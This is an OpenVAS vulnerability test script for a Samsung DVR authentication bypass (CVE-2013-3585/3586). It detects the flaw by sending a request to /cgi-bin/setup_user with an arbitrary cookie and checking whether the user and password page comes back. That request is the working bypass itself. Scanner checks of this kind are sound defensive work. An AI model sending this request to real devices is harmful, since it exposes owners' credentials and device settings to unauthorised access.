###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samsung_dvr_auth_bypass_08_13.nasl 14186 2019-03-14 13:57:54Z cfischer $
#
# Samsung DVR Authentication Bypass
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103770");
  script_version("$Revision: 14186 $");
  script_cve_id("CVE-2013-3585", "CVE-2013-3586");
  script_bugtraq_id(61942, 61938);
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");

  script_name("Samsung DVR Authentication Bypass");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/882286");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27753");
  script_xref(name:"URL", value:"http://www.andreafabrizi.it/?exploits:samsung:dvr");

  script_tag(name:"last_modification", value:"$Date: 2019-03-14 14:57:54 +0100 (Thu, 14 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-08-21 14:27:11 +0200 (Wed, 21 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"This vulnerability allows remote unauthenticated users to:

  - Get/set/delete username/password of local users (/cgi-bin/setup_user)

  - Get/set DVR/Camera general configuration

  - Get info about the device/storage

  - Get/set the NTP server

  - Get/set many other settings.");

  script_tag(name:"vuldetect", value:"Check if /cgi-bin/setup_user is accessible without authentication.");

  script_tag(name:"insight", value:"In most of the CGIs on the Samsung DVR, the session check is made
  in a wrong way, that allows to access protected pages simply putting an arbitrary cookie into the HTTP request.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"The remote Samsung DVR is prone to an Authentication Bypass.");
  script_tag(name:"affected", value:"Samsung DVR with firmware version <= 1.10.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

buf = http_get_cache(item:"/", port:port);

if("<title>Web Viewer for Samsung DVR</title>" >!< buf)exit(0);

host = http_host_name(port:port);

req = 'GET /cgi-bin/setup_user HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if("top.document.location.href" >!< result)exit(99);

req += 'Cookie: DATA1=YWFhYWFhYWFhYQ==\r\n\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if("<title>User</title>" >< result && "nameUser_Name_0" >< result && "nameUser_Pw_0" >< result) {
  security_message(port:port);
  exit(0);
}